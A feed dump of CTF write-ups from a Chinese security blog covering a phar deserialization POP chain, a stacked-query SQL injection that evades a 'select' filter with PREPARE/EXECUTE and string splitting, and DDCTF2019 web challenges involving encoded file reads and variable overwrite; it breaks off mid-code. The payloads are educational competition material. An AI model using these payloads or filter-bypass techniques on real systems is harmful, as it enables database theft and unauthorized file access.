</span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> S6ow();    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>); <span class="comment">//后缀名必须为phar</span></div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></div><div class="line">$o = <span class="keyword">new</span> sh0w();</div><div class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></div><div class="line"><span class="comment">//签名自动计算</span></div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>触发过程：</strong></p><p><strong>sh0w对象反序列化时调用<code>__destruct</code>，调用了S6ow对象的<code>_show</code>方法，由于_show方法不存在，从而调用了<code>__call</code>，此时<code>$this-&gt;{$name}</code>的值变为了<code>_show</code>，在进行<code>$this-&gt;{$name}</code>判断时，由于<code>_show</code>属性也不存在，从而触发了<code>__get</code>方法，<code>$this-&gt;{$name}</code>的值被赋为<code>file_get</code>，从而调用了<code>file_get</code>函数，由于一开始<code>$this-&gt;file</code>的值被设为了Show对象，所以这里将Show对象输出，触发了Show对象的<code>__ToString</code>方法，成功绕过了过滤读取flag</strong></p><p><strong>生成phar文件，将后缀重名名为.jpg上传至服务器,通过phar伪协议读取上传后的文件：<code>/file.php?file=phar:///var/www/html/upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg</code></strong></p><p><img src="http://pic.c1imber.top/blog/20191020/X1VVOQSvHbD7.png?imageslim" alt="mark"><br><strong>base64解码后获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/BO15lt513Lca.png?imageslim" alt="mark"></p><p><strong>剩下的题目，等待writeup出来后学习</strong></p><p><img src="http://pic.c1imber.top/blog/20191020/29mUSro8ePHA.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;a href=&quot;#2019极客巅峰ctf记录&quot; class=&quot;headerlink&quot; title=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;/a&gt;2019极客巅峰ctf记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;周六抽时间做了2019极客巅峰的ct
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯-过滤select的注入</title>
    <link href="https://c1aysec.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%BF%87%E6%BB%A4select%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/05/28/2019强网杯-过滤select的注入/</id>
    <published>2019-05-27T16:15:00.000Z</published>
    <updated>2019-11-06T17:21:20.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019强网杯-过滤select的注入"><a href="#2019强网杯-过滤select的注入" class="headerlink" title="2019强网杯-过滤select的注入"></a>2019强网杯-过滤select的注入</h1><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p><strong>这道题的题目就是随便注，说是取自某次真实渗透环境，确定了这道题是考察注入，经测试发现为单引号包裹的字符型注入，但是存在存在过滤，过滤的sql关键字如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/mY2fTXh6Wy5t.png" alt="mark"><br><strong>这里过滤了select关键字，/i表示对大小写进行检查，所以大小写绕过无效，所以这里需要想别的办法，首先通过报错注入可以获取数据库的相关信息</strong></p><p><strong>通过报错注入获取当前数据库类型与版本：</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/oF419eR52pVL.png" alt="mark"><br><strong>.27-MariaDB-0ubuntu0.16.04.1</strong></p><p><strong>获取当前数据库名：</strong><br><img src="http://pic.c1imber.top/blog/20190528/NtJ9xJxCGk4O.png" alt="mark"><br><strong>supersqli</strong></p><p><strong>这里因为严格过滤了select关键字，导致不能继续注入，但是之后发现可以执行多语句，通过堆叠查询成功获取当前数据库（supersqli）下的表名</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27;use%20supersqli;show%20tables;--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/0isGzvkxIDkd.png" alt="mark"><br><strong>于是有了一个清晰的思路，可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的 sql关键字拆分绕过检测，通过动态执行sql语句发现1919810931114514表当中存在flag字段，payload如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/LPeDMW7UJFWE.png" alt="mark"><br><strong>之后就可以获取flag列的内容了</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/hn2CDwKtqwoR.png" alt="mark"></p><p><strong>（需要注意的一点是这一点使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过）</strong><br><img src="http://pic.c1imber.top/blog/20190528/hXVAJ6ouP22Q.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;a href=&quot;#2019强网杯-过滤select的注入&quot; class=&quot;headerlink&quot; title=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;/a&gt;2019强网杯-过滤select的注入&lt;/h1&gt;&lt;h3 i
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019 write up</title>
    <link href="https://c1aysec.github.io/2019/04/18/DDCTF2019%20write%20up/"/>
    <id>https://c1aysec.github.io/2019/04/18/DDCTF2019 write up/</id>
    <published>2019-04-18T10:57:00.000Z</published>
    <updated>2019-11-06T17:02:23.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-write-up"><a href="#DDCTF2019-write-up" class="headerlink" title="DDCTF2019 write up"></a>DDCTF2019 write up</h1><p><strong>最近几天抽时间做了做DDCTF，只做出了几道Web，菜哭了==，这里将做出的题记录一下吧（参赛id:stark）</strong></p><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p><code>http://117.51.150.246</code></p><p><strong>打开题目后跳到了一个连接，页面内容是一个表情包，jpg参数值看起来像一串base64,如下图</strong><br><img src="http://pic.c1imber.top/blog/20190418/jS6lSMJKAepR.png" alt="mark"><br><strong>将jpg的参数值TmpZMlF6WXhOamN5UlRaQk56QTJOdz09经过两次base64解码和一次hex解码后得到flag.jpg，另外在页面源码里面看到了flag.jpg图片内容base64编码后的内容，这里是使用img标签通过data伪协议将图片显示到了页面中</strong><br><img src="http://pic.c1imber.top/blog/20190418/vS8u1pFyKvFV.png" alt="mark"><br><strong>所以猜测这里可能是一个任意文件读取，将index.php进行一次hex编码两次base64编码后得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3,将值传入jpg参数尝试读取index.php源码，可以读取成功</strong><br><img src="http://pic.c1imber.top/blog/20190418/oOkUiMmqI69p.png" alt="mark"><br><strong>结果如下：</strong></p><pre><code>PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=</code></pre><p><strong>base64解码后：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></div><div class="line"><span class="comment">* Date: July 4,2018</span></div><div class="line"><span class="comment">*/</span></div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"></div><div class="line"></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</div><div class="line">   header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</div><div class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</div><div class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* Can you find the flag file?</span></div><div class="line"><span class="comment">*</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>通过源码可以大概猜测出来flag在config.php配置文件里面，经过测试这个文件是存在的，但是str_replace(“config”,”!”, $file)会将传入的config.php替换为!.php，所以这里是绕不过去的，但是代码里面有一个博客链接：</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p><p><strong>这里可能是一个hint，但是这篇连接的文章并没有什么提示，接下来在博客里翻到了一篇文章，这个文章讲的是有关临时交换文件的</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80913909</code><br><img src="http://pic.c1imber.top/blog/20190418/76UJHkxGkBvK.png" alt="mark"><br><strong>这篇文章里面提到了一个名为practice.txt.swp的文件，开了一下脑洞，试着访问了一下该文件发现确实存在</strong><br><img src="http://pic.c1imber.top/blog/20190418/wkLLrE3SckL1.png" alt="mark"><br><strong>文件内容是另一个文件的名字f1ag!ddctf.php，并且里面有!，可以绕过之前的检测，所以这里可以读取到f1ag!ddctf.php文件，将f1agconfigddctf.php进行一次hex编码两次base64编码后构造出TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==,传入jpg参数读到f1ag!ddctf.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20190418/1aoU9BKDK0Ad.png" alt="mark"><br><strong>得到结果：</strong></p><pre><code>PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo/Pg==</code></pre><p><strong>base64解码得到源码内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">$k = <span class="string">'hello'</span>;</div><div class="line">extract($_GET);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</div><div class="line">&#123;</div><div class="line">    $content=trim(file_get_contents($k));</div><div class="line">    <span class="keyword">if</span>($uid==$content)</div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这里是一个简单的变量覆盖，可以构造:<code>http://117.51.150.246/f1ag!ddctf.php?uid=f1ag!ddctf.php&amp;k=practice.txt.swp</code>获取flag</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/QdTXwWrHMtNc.png" alt="mark"></p><p><strong>flag:DDCTF{436f6e67726174756c6174696f6e73}</strong></p><p><strong>另外这里有一个tip，可以不使用变量覆盖，直接构造<code>http://117.51.150.246/f1ag!ddctf.php?uid=</code>获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/cchVsB66NEWn.png" alt="mark"></p><p><strong>因为$k变量的值hello是一个不存在的文件，会导致<code>file_get_contents</code>返回False，接下来False经过<code>trim</code>函数处理后会产生一次类型转换变成空字符串，所以<code>$uid==$content</code>,直接输出了flag</strong></p><h3 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h3><p><code>http://117.51.158.44/index.php</code></p><p><strong>打开后直接访问会提示没有登陆权限</strong><br><img src="http://pic.c1imber.top/blog/20190418/qoL8pEHQ5e4X.png" alt="mark"><br><strong>查看源码后发现存在一个<code>/js/index.js</code>文件,index.js代码如下：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by PhpStorm.</span></div><div class="line"><span class="comment"> * User: didi</span></div><div class="line"><span class="comment"> * Date: 2019/1/13</span></div><div class="line"><span class="comment"> * Time: 9:05 PM</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        type: <span class="string">"post"</span>,</div><div class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</div><div class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</div><div class="line">        dataType: <span class="string">"json"</span>,</div><div class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</div><div class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</div><div class="line">        &#125;,</div><div class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</div><div class="line">           <span class="built_in">console</span>.log(getdata);</div><div class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</div><div class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</div><div class="line">           &#125;</div><div class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(error);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>通过简单的审计可以看到这里存在一个认证，通过ajax添加了一个http请求头<code>didictf_username</code>，猜测服务端是根据这个header头的值去做认证的，如果想访问到页面，首先需要得到出来一个username值,所以这里先对<code>didictf_username</code>进行爆破，通过爆破看到admin可以认证成功,之后会返回一个提示：app\/fL2XID2i0Cdh.php这个文件</strong><br><img src="http://pic.c1imber.top/blog/20190418/khmW4Jo6nXoL.png" alt="mark"><br><strong>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>,可以获取到源码，源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line">url:app/Application.php</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</div><div class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</div><div class="line">            <span class="string">'data'</span> =&gt; $data];</div><div class="line">        $ret = json_encode($ret);</div><div class="line">        header(<span class="string">'Content-type: application/json'</span>);</div><div class="line">        <span class="keyword">echo</span> $ret;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</div><div class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</div><div class="line">    $path = trim($path);</div><div class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</div><div class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</div><div class="line">    <span class="keyword">return</span> $path;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</div><div class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">url:app/Session.php</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//key建议为8位字符串</span></div><div class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</div><div class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;get_key();</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</div><div class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</div><div class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</div><div class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;session_create();</div><div class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</div><div class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">//eancrykey  and flag under the folder</span></div><div class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</div><div class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</div><div class="line"></div><div class="line">        <span 